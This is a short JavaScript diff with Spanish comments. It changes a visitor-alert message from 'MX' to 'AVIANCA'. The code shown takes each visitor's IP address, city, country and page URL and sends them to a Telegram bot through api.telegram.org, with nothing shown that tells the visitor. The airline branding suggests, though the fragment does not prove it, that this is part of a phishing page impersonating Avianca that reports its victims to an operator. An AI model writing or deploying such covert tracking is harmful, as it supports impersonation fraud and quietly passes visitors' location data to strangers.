@@ -15,7 +15,7 @@
     const data = await res.json();
 
     // Crear mensaje
-    const mensaje = `👤 Nueva visita a tu MX\n\n🌐 IP: ${data.ip}\n📍 Ciudad: ${data.city}, ${data.country}\n🔗 URL: ${window.location.href}`;
+    const mensaje = `👤 Nueva visita a tu AVIANCA\n\n🌐 IP: ${data.ip}\n📍 Ciudad: ${data.city}, ${data.country}\n🔗 URL: ${window.location.href}`;
 
     // Enviar mensaje a Telegram
     await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
